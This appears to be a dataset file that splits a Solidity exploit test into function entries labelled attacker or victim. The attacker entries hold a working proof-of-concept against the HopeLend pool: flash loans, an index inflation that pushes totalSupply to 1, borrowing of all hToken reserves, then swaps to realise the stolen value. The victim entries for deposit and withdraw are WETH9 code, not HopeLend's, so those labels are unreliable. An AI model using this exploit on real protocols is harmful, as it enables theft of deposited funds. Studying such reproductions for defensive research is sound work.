@@ -1,0 +1,128 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address[] calldata asset,\n        uint256[] calldata amount,\n        uint256[] calldata premium,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        index++;\n        if (index == 1) {\n            HopeLend.deposit(address(WBTC), 2000 * 1e8, address(this), 0);\n        }\n\n        if (index == 2) {\n            WBTC.transfer(address(hEthWBTC), 2000 * 1e8); // donate 2000 WBTC as flashloan fund to inflate index\n            HopeLend.withdraw(address(WBTC), 2000 * 1e8 - 1, address(this)); // manipulate totalSupply to 1\n            return true;\n        }\n\n        if (msg.sender != address(HopeLend)) {\n            uint256 idx = 0;\n            for (idx = 0; idx < 60; idx++) {\n                address[] memory assets = new address[](1);\n                assets[0] = address(WBTC);\n                uint256[] memory amounts = new uint256[](1);\n                amounts[0] = 2000 * 1e8;\n                uint256[] memory modes = new uint256[](1);\n                modes[0] = 0x0;\n\n                HopeLend.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0x0);\n            }\n\n            uint256 WETHBalance = WETH.balanceOf(address(0x396856F04836AaEba30311E2903B43E565a4323E)); // WETH_hToken\n            uint256 USDTBalance = USDT.balanceOf(address(0x6090F36F979bb221e71d5667afC3Bb445551B749)); // USDT_hToken\n            uint256 USDCBalance = USDC.balanceOf(address(0x5dd30eDdcFfb7Dc18136501cE21E408243303572)); // USDC_hToken\n            uint256 HOPEBalance = HOPE.balanceOf(address(0x58792e9279cC6a178bE5e367A145B75A36f74D90)); // HOPE_hToken\n            uint256 stHOPEBalance = stHOPE.balanceOf(address(0x1fC2dD0dCb64E0159B0474CFE6E45985522C9386)); // stHOPE_hToken\n            HopeLend.borrow(address(WETH), WETHBalance, 2, 0, address(this));\n            HopeLend.borrow(address(USDT), USDTBalance, 2, 0, address(this));\n            HopeLend.borrow(address(USDC), USDCBalance, 2, 0, address(this));\n            HopeLend.borrow(address(HOPE), HOPEBalance, 2, 0, address(this));\n            HopeLend.borrow(address(stHOPE), stHOPEBalance, 2, 0, address(this));\n\n            address[] memory path = new address[](2);\n            (path[0], path[1]) = (address(stHOPE), address(HOPE));\n            UniRouter02.swapExactTokensForTokens(stHOPEBalance, 0, path, address(this), type(uint256).max);\n\n            address[] memory path1 = new address[](2);\n            (path1[0], path1[1]) = (address(HOPE), address(USDT));\n            UniRouter02.swapExactTokensForTokens(\n                HOPE.balanceOf(address(this)), 0, path1, address(this), block.timestamp + 10_000\n            );\n\n            USDTToUSDC();\n            USDCToWBTC();\n            WithdrawAllWBTC();\n        }\n\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_377_041);\n        vm.label(address(this), \"AttackContract\");\n        vm.label(address(WBTC), \"WBTC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(HOPE), \"HOPE\");\n        vm.label(address(stHOPE), \"stHOPE\");\n        vm.label(address(AaveV3), \"AaveV3\");\n        vm.label(address(HopeLend), \"HopeLend\");\n        vm.label(address(hEthWBTC), \"hEthWBTC\");\n        vm.label(address(UniRouter02), \"UniRouter02\");\n        vm.label(address(Router), \"UniRouterV3\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testAttack",
+    "original_code": "    function testAttack() public {\n        deal(address(this), 0);\n        approveAll();\n\n        address[] memory assets = new address[](1);\n        assets[0] = address(WBTC);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 2300 * 1e8;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n\n        AaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n\n        WBTCToWETH();\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        block.coinbase.call{value: 264 ether}(\"\");\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, WETH.decimals());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IHopeLendPool",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IHopeLendPool",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IHopeLendPool",
+    "source_type": "victim_contract",
+    "function_name": "flashLoan",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IHopeLendPool",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
+    "description": ""
+  }
+]
